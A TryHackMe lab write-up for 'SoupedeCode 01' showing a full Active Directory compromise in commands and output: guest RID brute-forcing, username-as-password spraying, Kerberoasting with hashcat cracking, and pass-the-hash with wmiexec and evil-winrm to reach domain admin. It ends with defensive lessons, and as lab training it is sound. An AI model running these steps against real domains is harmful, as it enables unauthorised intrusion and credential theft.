# SoupedeCode 01 - TryHackMe Writeup

**Target:** `TARGET_IP` (10.128.129.244 at time of solve)
**Domain:** `SOUPEDECODE.LOCAL`
**DC:** `DC01.SOUPEDECODE.LOCAL`
**OS:** Windows Server (Active Directory Domain Controller)
**Difficulty:** Easy

---

## Attack Chain Overview

```
Anonymous SMB (guest) ? IPC$ accessible
    ?
RID Brute (nxc --rid-brute) ? domain user list
    ?
Password Spraying user==password ? ybob317:ybob317
    ?
SMB enum as ybob317 ? read user.txt from users share
    ?
Kerberoast (GetUserSPNs) ? file_svc TGS hash
    ?
hashcat -m 13100 ? file_svc:Password123!!
    ?
SMB read on \backup share ? backup_extract.txt with machine NTLM hashes
    ?
Pass-the-Hash as FileServer$ (computer account in Domain Admins path)
    ?
wmiexec/winrm ? BUILTIN\Administrators ? Administrator flag
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Anonymous SMB & RID Brute](#anonymous-smb--rid-brute)
3. [Password Spraying ? ybob317](#password-spraying--ybob317)
4. [User Flag](#user-flag)
5. [Kerberoasting ? file_svc](#kerberoasting--file_svc)
6. [Backup Share ? Machine Account Hash](#backup-share--machine-account-hash)
7. [Pass-the-Hash as FileServer$](#pass-the-hash-as-fileserver)
8. [Root Flag](#root-flag)
9. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Host Setup
```bash
export TARGET=10.128.129.244
# What it does: add the domain controller's hostnames to /etc/hosts.
# Why here: ensure proper Kerberos authentication and service resolution for the soupedecode.local domain.
echo "$TARGET soupedecode.local DC01.soupedecode.local DC01" | sudo tee -a /etc/hosts
# What it does: synchronize the attacker's system time with the DC's time.
# Why here: prevent Kerberos authentication errors caused by time skew, which must be within 5 minutes for successful ticket requests.
sudo ntpdate -u $TARGET   # sync with DC before Kerberos requests
```

### Port Discovery
```bash
# What it does: run a full port scan on the target DC.
# Why here: map the AD attack surface, identifying ports for Kerberos, SMB, LDAP, and WinRM.
nmap -sS -p- --min-rate 5000 -n $TARGET
nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5985 $TARGET -oA service-scan
```

Classic Windows Domain Controller surface: DNS, Kerberos, LDAP/LDAPS, SMB, Global Catalog, WinRM.

---

## Anonymous SMB & RID Brute

### Unauthenticated checks
```bash
# What it does: list available SMB shares anonymously.
# Why here: identify initial attack surface and check for guest-accessible resources.
smbclient -N -L //$TARGET/
# What it does: attempt an unauthenticated SMB session to identify the target domain and OS.
# Why here: confirm if the host allows guest sessions or leaks the NetBIOS/DNS domain name for later enumeration.
crackmapexec smb $TARGET -u '' -p ''
# What it does: launches a broad SMB/RPC enumeration.
# Why here: collect users, shares, groups and domain clues.
enum4linux -a $TARGET
```

`enum4linux` reports RID ranges **500Â–550** and **1000Â–1050** Â— the DC responds to SAMR queries with at least the guest account.

### Guest account is valid
```bash
# What it does: verify the guest account's validity and permissions over SMB shares.
# Why here: identify readable shares that might contain sensitive data or allow for initial user enumeration.
crackmapexec smb $TARGET -u 'guest' -p ''
crackmapexec smb $TARGET -u 'guest' -p '' --shares
```

```
SMB   10.128.129.244  445  DC01  IPC$  READ  Remote IPC
```

Guest can bind, only `IPC$` is readable Â— that is enough for RID-brute enumeration against LSARPC.

### RID Brute via netexec
```bash
# What it does: perform a RID brute-force attack via the anonymous guest account.
# Why here: enumerate valid domain usernames by walking the Security Identifiers (SIDs) through the LSARPC interface.
nxc smb $TARGET -u guest -p '' --rid-brute > rid_brute.txt
```

`enumdomusers` over `rpcclient` as guest is blocked, but `--rid-brute` abuses LSA to walk SIDs.

### Extract just the usernames
```bash
# What it does: parse the RID brute-force output to isolate valid domain usernames.
# Why here: generate a clean user list for password spraying and AS-REP roasting.
grep 'SOUPEDECODE\\' rid_brute.txt \
  | cut -d':' -f2- \
  | sed -E 's/.*SOUPEDECODE\\(.*) \(SidType.*/\1/' \
  | grep -v '\$' \
  > usernames.txt
```

`grep -v '\$'` strips the machine accounts (they end in `$`) so spraying stays focused on humans.

---

## Password Spraying ? ybob317

### AS-REP Roast (no pre-auth) Â— no hits
```bash
# What it does: attempt to extract AS-REP hashes for accounts with pre-authentication disabled.
# Why here: identify high-value targets that allow offline password cracking without needing initial credentials.
impacket-GetNPUsers -dc-ip $TARGET SOUPEDECODE.LOCAL/ \
  -usersfile usernames.txt -format hashcat -outputfile asreproast.txt
```

### user == password spray
```bash
nxc smb soupedecode.local -u usernames.txt -p usernames.txt \
  --no-brute --continue-on-success
```

`--no-brute` switches the combo logic from NÃ—M to "N pairs" (line-for-line), which is how we test `username == password`. Hit:

```
SMB  10.128.129.244  445  DC01  [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

---

## User Flag

```bash
smbmap -H $TARGET -u 'ybob317' -p 'ybob317' -r
```

One of the readable shares contains a `user.txt` readable by `ybob317`. Download it:

```bash
# What it does: authenticate to the users share to retrieve a specific file.
# Why here: capture the user flag from the compromised ybob317 profile.
smbclient //$TARGET/users -U 'SOUPEDECODE.LOCAL/ybob317%ybob317' -c 'get ybob317/user.txt'
```

---

## Kerberoasting ? file_svc

Any authenticated user can request TGS tickets for accounts with an SPN. If those accounts have weak passwords, the RC4-encrypted TGS is crackable offline.

```bash
# What it does: perform Kerberoasting to extract TGS hashes for service accounts.
# Why here: identify service accounts like file_svc with SPNs that can be cracked offline for lateral movement.
impacket-GetUserSPNs soupedecode.local/ybob317:ybob317 \
  -dc-ip $TARGET -request -output hashes.txt
```

### Crack
```bash
# What it does: crack the recovered Kerberos TGS hashes with Hashcat.
# Why here: recover the cleartext password for the file_svc account to access restricted SMB shares.
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Recovered:**
```
SOUPEDECODE.LOCAL\file_svc : Password123!!
```

### Validate
```bash
# What it does: verify the file_svc account's permissions across the domain.
# Why here: confirm authenticated access to shares like backup that are restricted to administrative or service users.
netexec smb $TARGET -u 'file_svc' -p 'Password123!!'
```

---

## Backup Share ? Machine Account Hash

`file_svc` has read access to a `backup` share that `ybob317` did not:

```bash
smbmap -H $TARGET -u 'file_svc' -p 'Password123!!' -r
# What it does: authenticate to the backup share using service account credentials.
# Why here: retrieve the backup_extract.txt file containing machine account hashes.
smbclient //$TARGET/backup -U 'file_svc%Password123!!'
```

Download `backup_extract.txt`. The file contains **NTLM hashes for machine accounts** Â— the hashes look random and long because computer account passwords are 120-char auto-generated strings.

**Target line:**
```
FileServer$ : aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559
```

---

## Pass-the-Hash as FileServer$

Machine accounts can be a dead end Â— but here `FileServer$` is a member of `Domain Admins` / has local admin on DC01 (this is the lab's intended path). PTH lets us authenticate without cracking.

```bash
# What it does: perform a Pass-the-Hash attack using the machine account NTLM hash.
# Why here: leverage the FileServer$ machine account's administrative privileges on the DC to gain SYSTEM access.
impacket-wmiexec \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559' \
  'soupedecode.local/FileServer$@'$TARGET
```

Alternate paths with the same hash:

```bash
# Remote shell via WMI (SYSTEM / admin context)
# What it does: execute a remote shell via WMI using a captured NTLM hash.
# Why here: obtain a SYSTEM-level shell on the DC by passing the FileServer$ machine account hash.
impacket-wmiexec -hashes ':e41da7e79a4c76dbd9cf79d1cb325559' soupedecode.local/FileServer\$@$TARGET

# WinRM (if enabled and account is Remote Management Users)
# What it does: obtain an interactive WinRM shell using a captured NTLM hash.
# Why here: obtain interactive Windows access after validating credentials.
evil-winrm -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559' -i $TARGET
```

### Verify privileges
```
C:\> whoami /groups
BUILTIN\Administrators   S-1-5-32-544   Mandatory group, Enabled by default, Enabled group, Group owner
```

`BUILTIN\Administrators` on the DC = full control of the domain.

---

## Root Flag

```
C:\> type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | Anonymous SMB / guest | `enum4linux` revealed SID ranges; guest allowed IPC$ bind |
| **User Discovery** | `nxc --rid-brute` | LSA walk extracts AD user list without domain creds |
| **Initial Access** | Password spraying (user == password) | `--no-brute` pairs usernames with themselves |
| **Lateral Movement** | Kerberoasting (`GetUserSPNs`) | `file_svc` TGS cracked to `Password123!!` |
| **Credential Hunting** | Share enumeration as new user | `backup_extract.txt` on `\backup` share held machine hashes |
| **Privilege Escalation** | Pass-the-Hash (`wmiexec`) | `FileServer$` had `BUILTIN\Administrators` on DC01 |

### Security Lessons

1. **Guest accounts and anonymous binds are reconnaissance gifts.** Disable `guest`, set `RestrictAnonymous` and `RestrictAnonymousSAM`.
2. **RID cycling is not noisy unless you watch for it.** Alert on unusual LSA query volume from a single authenticated principal.
3. **Service accounts with weak passwords are the number-one AD compromise vector.** Use gMSAs or enforce =25-char passwords on any account with an SPN.
4. **Never store machine-account hashes in readable shares.** Computer-account passwords are equivalent to permanent credentials for the host itself.
5. **Machine accounts belong in least-privilege groups.** `FileServer$` should not be a Domain Admin.

### Related Notes
- [netexec](../../../tools/recon/netexec.md) Â— RID brute, spraying, PTH
- [impacket](../../../tools/windows/impacket.md) Â— `GetUserSPNs`, `wmiexec`
- [hashcat](../../../tools/creds/hashcat.md) Â— `-m 13100` Kerberos TGS RC4
- [evil-winrm](../../../tools/windows/evil-winrm.md) Â— hash-authenticated WinRM
- [SMB anonymous enumeration](../../../exploits/ad/smb-anonymous-enum.md)
- [Password spraying](../../../exploits/ad/password-spraying.md)
- [AS-REP Roast & Kerberoast](../../../exploits/ad/kerberos-roasting.md)
